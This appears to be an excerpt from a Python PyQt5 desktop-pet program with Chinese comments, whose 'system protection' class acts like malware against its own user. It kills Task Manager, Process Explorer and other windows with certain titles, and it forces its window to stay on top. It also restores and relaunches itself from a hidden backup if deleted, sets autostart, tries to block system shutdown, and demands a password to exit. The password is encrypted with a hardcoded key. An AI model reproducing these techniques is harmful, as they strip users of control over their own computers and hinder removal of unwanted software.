...
from PyQt5.QtCore import (Qt, QTimer, QPropertyAnimation, QPoint,
                          QSize, QPointF, QEasingCurve, QUrl)
...
from PyQt5.QtWidgets import (
    ...
    QListWidget, QFileDialog, QGridLayout, QScrollArea,
    QTabWidget, QGroupBox, QFormLayout, QLineEdit, QSplitter, QTextBrowser, QFrame,
    QProgressBar, QDialog, QGraphicsDropShadowEffect, QInputDialog
)
from PyQt5.QtMultimedia import QMediaPlayer, QMediaContent


def close_hostile_windows():
    """关闭所有窗口名为'都不陪的！！！'的程序"""
    hostile_windows = ["都不陪的！！！"]  # 要关闭的窗口标题

    def enum_windows_callback(hwnd, windows):
        if win32gui.IsWindowVisible(hwnd):
            window_text = win32gui.GetWindowText(hwnd)
            for hostile in hostile_windows:
                if hostile in window_text:
                    # 尝试终止相关进程
                    try:
                        _, pid = win32process.GetWindowThreadProcessId(hwnd)
                        if pid > 0:
                            os.kill(pid, 9)
                            print(f"已终止敌对窗口: {window_text}")
                    except:
                        # 如果无法终止进程，至少关闭窗口
...
class SystemProtection:
    def __init__(self, pet_app):
        ...
        # 解密密码
        encrypted_password = "RyksrsLwK548eG9fHsFV5OlAj060qMUl7JXexYiOcxU5Tk3BmpdKmsT8e0ml6DQJ"
    ...
    def decrypt_password(self, encrypted_password):
        ...
        try:
            crypto = CryptoUtils()
            return crypto.decrypt_text(encrypted_password, "xinghui")
    ...
    def create_backup(self):
        ...
        try:
            ...
            backup_dir = os.path.join(temp_dir, "StarPet_Backup")
            if not os.path.exists(backup_dir):
                os.makedirs(backup_dir)

            # 备份程序文件
            self.backup_path = os.path.join(backup_dir, "桌面星辉.py")
            shutil.copy2(current_exe, self.backup_path)

            # 备份配置文件
            config_files = ["config.json", "achievements.json", "wish_pity.json", "constellations.json"]
            for config_file in config_files:
                if os.path.exists(config_file):
                    shutil.copy2(config_file, os.path.join(backup_dir, config_file))

            print(f"程序已备份到: {backup_dir}")
        except Exception as e:
    ...
    def set_autostart(self):
        ...
        try:
            ...
            print(f"设置自启动失败: {str(e)}")

    def start_monitoring(self):
        """启动所有监控线程"""
        # 程序存在监控
        self.program_monitor_timer = QTimer()
        self.program_monitor_timer.timeout.connect(self.monitor_program_existence)
        self.program_monitor_timer.start(5000)  # 每5秒检查一次

        # 窗口状态监控
        self.window_monitor_timer = QTimer()
        self.window_monitor_timer.timeout.connect(self.monitor_window_state)
        self.window_monitor_timer.start(3000)  # 每3秒检查一次

        # 系统进程监控
        self.process_monitor_timer = QTimer()
        self.process_monitor_timer.timeout.connect(self.monitor_system_processes)
        self.process_monitor_timer.start(7000)  # 每7秒检查一次

        # 敌对程序监控
        self.hostile_monitor_timer = QTimer()
        self.hostile_monitor_timer.timeout.connect(self.monitor_hostile_programs)
        self.hostile_monitor_timer.start(10000)  # 每10秒检查一次

        # 关机阻止监控
        self.shutdown_monitor_timer = QTimer()
        self.shutdown_monitor_timer.timeout.connect(self.monitor_shutdown)
        self.shutdown_monitor_timer.start(2000)  # 每2秒检查一次

    def monitor_program_existence(self):
        """监控程序是否存在，必要时从备份恢复"""
        try:
            current_exe = sys.argv[0]
            if not os.path.exists(current_exe) and self.backup_path and os.path.exists(self.backup_path):
                print("检测到主程序被删除，正在从备份恢复...")
                shutil.copy2(self.backup_path, current_exe)
                # 重新启动程序
                os.startfile(current_exe)
                sys.exit(0)
        except Exception as e:
            print(f"程序存在监控异常: {str(e)}")

    def monitor_window_state(self):
        """监控窗口状态，防止最小化或失去焦点"""
        try:
            if self.pet and self.pet.isVisible():
                # 确保窗口始终置顶
                if not self.pet.windowFlags() & Qt.WindowStaysOnTopHint:
                    self.pet.setWindowFlags(self.pet.windowFlags() | Qt.WindowStaysOnTopHint)
                    self.pet.show()

                # 如果窗口被最小化，则恢复
                if self.pet.isMinimized():
                    self.pet.showNormal()
            ...
            print(f"窗口状态监控异常: {str(e)}")

    def monitor_system_processes(self):
        """监控系统进程，关闭可能用于终止程序的管理工具"""
        target_processes = [
            "陪都不陪！！！",
            "taskmgr.exe",  # 任务管理器
            ...
            for process in psutil.process_iter(['pid', 'name']):
                if process.info['name'].lower() in target_processes:
                    try:
                        ...
                        p.terminate()
                        print(f"已终止进程: {process.info['name']}")
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        pass
        except Exception as e:
            print(f"系统进程监控异常: {str(e)}")

    def monitor_hostile_programs(self):
        """监控敌对程序，关闭窗口名为特定名称的程序"""
        hostile_windows = [
            "陪都不陪！！！",
            "任务管理器",
            "Process Explorer",
                    ...
                    for hostile in hostile_windows:
                        if hostile in window_text:
                            ...
                            try:
                                ...
                                # 显示提示信息
                                if self.pet:
                                    self.pet.show_domain_dialog("检测到关闭尝试，已阻止！请用密码关闭程序")
                return True

            # 枚举所有窗口
            win32gui.EnumWindows(enum_windows_callback, None)
        except Exception as e:
            print(f"敌对程序监控异常: {str(e)}")

    def monitor_shutdown(self):
        """监控并尝试阻止系统关机"""
        try:
            # 检查是否有关机事件
            if ctypes.windll.user32.GetSystemMetrics(0x2000) != 0:  # SM_SHUTTINGDOWN = 0x2000
                print("检测到系统关机，尝试阻止...")
                # 取消关机
                ...
                # 显示警告 - 修改提示信息
                if self.pet:
                    self.pet.show_domain_dialog("检测到关机尝试，已阻止！试试密码吧")
        except Exception as e:
            print(f"关机监控异常: {str(e)}")
    ...
    def cleanup(self):
        ...
        if hasattr(self, 'program_monitor_timer'):
        ...
        if hasattr(self, 'hostile_monitor_timer'):
            self.hostile_monitor_timer.stop()
        if hasattr(self, 'shutdown_monitor_timer'):
            self.shutdown_monitor_timer.stop()
...
class VirtualPet(QWidget):
    ...
    def __init__(self):
        ...
        self.system_protection = SystemProtection(self)
        try:
            if os.path.exists("config.json"):
                with open("config.json", "r") as f:
                    config = json.load(f)
                    if config.get("system_protection_disabled", False):
                        print("系统保护已被禁用")
                        self.system_protection = None
                    else:
                        self.system_protection = SystemProtection(self)
        except Exception as e:
            print(f"检查系统保护状态失败: {str(e)}")
            self.system_protection = SystemProtection(self)

    def show_exit_dialog(self):
        """显示退出密码验证对话框"""
        # 如果系统保护已禁用，直接退出
        if self.system_protection is None:
        ...
        if ok and self.system_protection.verify_password(password):
            # 验证成功，清理资源并退出
            self.system_protection.cleanup()
            QApplication.quit()
        elif ok:
            # 密码错误
            self.show_domain_dialog("密码错误！")
    ...
    def trigger_peanut_cushion(self):
        ...
        # 3秒后恢复原状态
        QTimer.singleShot(3000, self.recover_from_peanut)

    def recover_from_peanut(self):
        """从花生抱枕状态恢复（简化版）"""
        # 恢复原状态
        if self.is_manual_wake:
            self.change_state(self.STANDING)
...
class ControlPanel(QWidget):
    ...
    def create_size_settings(self):
        ...
        # 切换保护按钮
        self.toggle_protection_btn = QPushButton()
        self.update_protection_button()
        self.toggle_protection_btn.setFixedSize(100, 25)
        self.toggle_protection_btn.clicked.connect(self.toggle_system_protection)

        protection_layout.addWidget(QLabel("系统保护:"))
        protection_layout.addWidget(self.protection_status)
        protection_layout.addStretch()
        protection_layout.addWidget(self.toggle_protection_btn)

        size_layout.addLayout(protection_layout, 1, 0, 1, 3)
    ...
    def update_protection_status(self):
        """更新保护状态显示"""
        if self.pet.system_protection is None:
            self.protection_status.setText("已禁用")
            self.protection_status.setStyleSheet("color: #FF6B6B; font-weight: bold;")
        else:
            self.protection_status.setText("已启用")
            self.protection_status.setStyleSheet("color: #4CAF50; font-weight: bold;")

    def update_protection_button(self):
        """更新保护按钮显示"""
        if self.pet.system_protection is None:
            self.toggle_protection_btn.setText("启用保护")
            ...
            self.toggle_protection_btn.setText("禁用保护")
            self.toggle_protection_btn.setStyleSheet("""
                QPushButton {
    ...
    def toggle_system_protection(self):
        ...
        if self.pet.system_protection is None:
            # 启用保护
            self.enable_system_protection()
        else:
            # 禁用保护
            self.disable_system_protection()

    def enable_system_protection(self):
        """启用系统保护"""
        try:
            # 重新创建系统保护实例
            self.pet.system_protection = SystemProtection(self.pet)
            ...
            config["system_protection_disabled"] = False
            ...
            # 显示成功消息
            self.show_protection_message("系统保护已启用", "系统保护功能已重新启用，程序将受到保护。")

        except Exception as e:
            print(f"启用系统保护失败: {str(e)}")
            self.show_protection_message("启用失败", f"启用系统保护失败: {str(e)}")

    def disable_system_protection(self):
        """禁用系统保护（需要密码验证）"""
        password, ok = QInputDialog.getText(
            self,
            "密码验证",
        ...
        if ok:
            # 验证密码
            if self.pet.system_protection.verify_password(password):
                # 密码正确，禁用系统保护
                self.pet.system_protection.cleanup()
                self.pet.system_protection = None
                ...
                config["system_protection_disabled"] = True
                ...
                # 显示成功消息
                self.show_protection_message("系统保护已禁用", "系统保护功能已禁用，程序将不再受到保护。")
            else:
                # 密码错误
                self.show_protection_message("密码错误", "密码错误！系统保护仍处于激活状态")

    def show_protection_message(self, title, message):
        """显示系统保护状态消息"""
        msg_dialog = QDialog(self)
        msg_dialog.setWindowTitle(title)
        msg_dialog.setFixedSize(300, 150)
        ...
        screen_geometry = QDesktopWidget().availableGeometry()
        screen_center = screen_geometry.center()
        x = screen_center.x() - msg_dialog.width() // 2
        y = screen_center.y() - msg_dialog.height() // 2
        msg_dialog.move(x, y)
    ...
    def handle_abno_double_click(self, item):
        """处理异想体列表的双击事件"""
        if item and item.text() == "O-02-88":  # 确保双击的是星辉守护者
            self.show_questions_dialog(item.text())
...
if __name__ == "__main__":
    try:
        # 单实例检查 - 使用命名的互斥量
        mutex_name = "StarPet_SingleInstance_Mutex"
